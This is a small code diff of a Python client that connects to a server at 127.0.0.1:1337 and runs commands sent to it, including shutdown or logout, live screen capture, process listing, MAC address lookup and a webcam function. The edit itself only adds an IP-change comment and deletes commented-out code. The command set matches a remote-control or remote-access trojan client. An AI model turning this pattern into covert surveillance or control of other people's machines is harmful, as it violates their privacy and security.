@@ -57,7 +57,7 @@ def webcam():
 def Connect():
     global client
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect(("127.0.0.1", 1337))
+    client.connect(("127.0.0.1", 1337)) # Change ip to correct server IP
     print("[?] Client connected!")
     while True:
         msg = client.recv(BUFSIZ).decode("utf8")
@@ -68,8 +68,6 @@ def Connect():
             shutdown_logout()
         elif "LIVESCREEN" in msg:
             live_screen()
-        # elif  "STOP_RECEIVING" in msg:
-        #     pass # wtf ?
         elif "APP_PRO" in msg:
             app_process()
         elif "MAC" in msg:
